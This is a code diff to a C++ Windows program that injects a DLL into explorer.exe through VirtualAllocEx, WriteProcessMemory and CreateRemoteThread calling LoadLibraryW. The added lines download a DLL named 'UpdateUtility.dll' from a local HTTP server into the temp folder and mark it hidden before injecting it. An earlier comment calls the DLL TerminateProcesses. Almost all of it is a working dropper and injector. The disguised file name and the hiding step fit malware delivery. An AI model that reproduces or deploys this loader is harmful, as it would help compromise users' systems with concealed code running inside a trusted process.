@@ -7,7 +7,8 @@ Gets the PID of explorer.exe by name and attempts to inject DLL at {dllPath} int
 #include<iostream>
 #include <vector>
 #include <processthreadsapi.h>
-
+#include <fileapi.h>
+#pragma comment(lib, "urlmon.lib")
 
 //Returns the handle of process by name {toFind}
 HANDLE getExplorer(std::string toFind) {
@@ -34,32 +35,50 @@ int main() {
 	HANDLE processHandle;
 	PVOID remoteBuffer;
 
-	//Relative path doesn't work because it needs to be from the perspective of Explorer.exe I think
-	//Just need to place TerminateProcesses.dll in a writeable Windows directory
-	//wchar_t dllPath[] = TEXT("..\\..\\..\\TerminateProcesses\\x64\\Release\\TerminateProcesses.dll");
-	wchar_t dllPath[] = TEXT("C:\\Users\\shell\\source\\repos\\Terminator\\TerminateProcesses\\x64\\Release\\TerminateProcesses.dll");
+	//Get temporary path
+	const int BUFLEN = 1024;
+	wchar_t tmpPath[BUFLEN];
+	GetTempPathW(BUFLEN, tmpPath);
+	std::wstring dp = std::wstring(tmpPath);
+	dp += TEXT("UpdateUtility.dll");
+	const wchar_t* dllPath = dp.c_str();
+	
+	//Download to temp file path
+	std::wstring url = TEXT("http://127.0.0.1:8000/UpdateUtility.dll");
+	URLDownloadToFile(NULL, url.c_str(), dllPath, 0, NULL);
+	SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN);
 
 	//Get handle for explorer
 	processHandle = getExplorer("explorer.exe");
 	if (processHandle != 0) {
 		//Allocate enough memory in Explorer.exe process to write the path to the DLL
-		remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+		remoteBuffer = VirtualAllocEx(processHandle, NULL, dp.size() * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
 		if (remoteBuffer) {
 			//Write the path to explorer.exe's memory and call loadlibrary on it
-			WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
-			HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));
-			PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
-			//Create the thread and celebrate
-			CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
-			std::cout << "You did it!";
+			if (WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, dp.size() * sizeof(wchar_t), NULL)) {
+				HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));
+				PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
+				//Create the thread and celebrate
+				if (CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL) != NULL) {
+					std::cout << "You did it!\n";
+				}
+				else
+				{
+					std::cout << "So close!\n";
+				}
+			}
+			else
+			{
+				std::cout << "WriteProcessMemory failed\n";
+			}
 		}
 		else {
-			std::cout << "VirtualAllocEx failed";
+			std::cout << "VirtualAllocEx failed\n";
 		}
 		CloseHandle(processHandle);
 	}
 	else {
-		std::cout << "Unsuccessful";
+		std::cout << "Unsuccessful\n";
 		return -1;
 	}
 }
